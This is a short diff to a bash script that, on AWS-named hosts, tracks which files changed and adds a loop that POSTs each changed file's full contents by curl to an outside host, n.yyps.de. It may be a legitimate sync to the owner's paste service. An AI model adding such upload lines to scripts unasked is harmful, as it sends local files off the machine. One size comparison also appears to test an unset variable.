@@ -19,7 +19,11 @@ if [[ $(hostname) = *"aws"* ]]; then
       MY_FILE_SIZE1=$($HOME/bin/size.sh ./$line --json | jq '.bytes')
       MY_FILE_SIZE2=$(cat ~/.mojopaste/mojolist2 | grep $line  | awk '{ print $5 }')
       [[ $MY_FILE_SIZE1 != $MY_FILE_SIZE ]] && echo $line >> ~/.mojopaste/my_changes
-  done
+    done
+       for line in $(cat ~/.mojopaste/my_changes); do
+        curl -d "$(cat $line)" https://n.yyps.de/cb
+        curl -d "$(cat $line)" https://n.yyps.de/alert
+      done
   fi
 fi
 echo $MY_SIZE >~/.mojopaste/my_size
